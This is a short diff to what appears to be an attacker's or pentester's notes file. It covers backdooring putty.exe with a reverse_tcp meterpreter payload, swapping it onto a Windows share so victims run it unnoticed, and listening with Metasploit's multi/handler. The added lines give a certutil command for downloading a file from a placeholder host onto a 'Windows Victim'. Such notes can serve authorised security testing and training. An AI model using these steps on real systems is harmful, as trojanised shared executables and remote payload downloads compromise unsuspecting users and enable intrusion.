@@ -112,4 +112,10 @@ To create a backdoored putty.exe, we can use the following command:
 The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. 
 Once the file has been generated, we can replace the executable on the windows share and wait for any connections using the exploit/multi/handler module from Metasploit.
 
+####################
+####################
+
+In Windows VIctim Download File:
+        certutil -urlcache -f http://x.x.x.x:8080/FileName  FileName
+
 
